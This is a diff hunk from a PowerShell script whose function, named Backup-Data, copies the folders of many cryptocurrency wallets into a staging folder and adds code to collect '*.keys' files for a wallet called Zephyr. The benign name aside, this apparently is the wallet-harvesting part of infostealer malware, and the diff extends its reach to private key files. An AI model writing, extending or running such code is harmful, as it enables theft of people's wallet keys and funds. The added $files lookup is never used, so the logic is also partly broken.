@@ -762,15 +762,20 @@ function Backup-Data {
             }
         } 
         foreach ($wallet in $wallet_paths.Keys) {
-            foreach ($pathName in $wallet_paths[$wallet].Keys) {
-                $sourcePath = $wallet_paths[$wallet][$pathName]
-                if (Test-Path $sourcePath) {
-                    $destination = Join-Path -Path $folder_crypto -ChildPath $pathName
-                    New-Item -ItemType Directory -Path $destination -Force | Out-Null
-                    Copy-Item -Path $sourcePath -Destination $destination -Recurse -Force
-                }
-             }
-          }
+        foreach ($pathName in $wallet_paths[$wallet].Keys) {
+            $sourcePath = $wallet_paths[$wallet][$pathName]
+			if ($wallet -eq "Zephyr") {
+                $files = Get-ChildItem -Path $sourcePath -Recurse -Filter "*.keys" -ErrorAction SilentlyContinue
+            } else {
+                $files = Get-ChildItem -Path $sourcePath -ErrorAction SilentlyContinue
+            }
+            if (Test-Path $sourcePath) {
+                $destination = Join-Path -Path $folder_crypto -ChildPath $pathName
+                New-Item -ItemType Directory -Path $destination -Force | Out-Null
+                Copy-Item -Path $sourcePath -Destination $destination -Recurse -Force
+            }
+         }
+      }
     }
     Local_Crypto_Wallets
 	
